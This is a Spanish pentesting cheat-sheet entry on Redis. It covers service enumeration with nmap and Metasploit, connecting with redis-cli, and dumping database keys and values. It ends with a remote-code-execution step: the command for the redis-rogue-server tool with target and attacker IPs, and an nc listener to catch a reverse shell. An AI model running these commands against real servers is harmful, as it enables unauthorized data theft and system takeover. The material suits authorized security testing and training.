---
title: "Redis"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/redis"
date: "2025-09-30"
---

# Redis
Redis es un almacén de **estructuras de datos en memoria**, de código abierto (licencia BSD), utilizado como **base de datos**, caché y broker de mensajes.

Por defecto, Redis utiliza un protocolo basado en texto plano, pero debes tener en cuenta que también puede implementar **ssl/tls**.

#### Enumeración
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```

Si damos con un fichero de configuración, las líneas mas importantes son:
* requirepass (en caso de tener contraseña la veremos ahí)

#### Conexion a servidor Redis
```bash
### SIN CONTRASEÑA
redis-cli -h 192.168.1.100 -p 6379 
### CON CONTRASEÑA
redis-cli -h 192.168.1.100 -p 6379 -a 'tu_contraseña'
```

#### Comandos básicos
```bash
INFO
CONFIG GET *

### Obtener datos
INFO keyspace
SELECT 1 # [ ... Indicate the database ... ]
KEYS * # [ ... Get Keys ... ]
GET <KEY> # [ ... Get Key ... ]

```

##### Obtener datos (explicado)
```bash
####VER LAS BASES DE DATOS
INFO keyspace
# Keyspace
db0:keys=5,expires=0,avg_ttl=0 #### AQUI VEMOS QUE TENEMOS UNA BASE DE DATOS, LA 0. si tuvieramos mas, veriamos algo así:

db0:keys=5,expires=0,avg_ttl=0
db1:keys=5,expires=0,avg_ttl=0
db2:keys=5,expires=0,avg_ttl=0
...


#### OBTENER LOS DATOS
SELECT 0 # seleccionar base de datos
KEYS * # vert todas "tablas"
GET <KEY_NAME> # "ver el valor de esa clave / tabla"

###################################
########DEPENDE EL TIPO DE DATOS, E LUGAR DE GET debemos usar estos otros.
if value is of type string -> GET <key>  
if value is of type hash -> HGETALL <key>  
if value is of type lists -> lrange <key> <start> <end>  
if value is of type sets -> smembers <key>  
if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>

# EJEMPLO
lrange <key> 0 100 (los numeros de 0 a 100 puede variar, es ir probando)
```

### Redis RCE
[Redis-rogue-server.py](https://github.com/n0b0dyCN/redis-rogue-server)
Con esta herramienta puedes obtener una shell interactiva para versiones igual o inferior a la 5.0.5
*uso*
```bash
python3 ./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP> --passwd='CONTRASEÑA_EN_CASO_NECESARIO'

##NOS PEDIRÁ LA IP DE ATACANTE Y UN PUERTO
nc -nlvp <puerto>
```





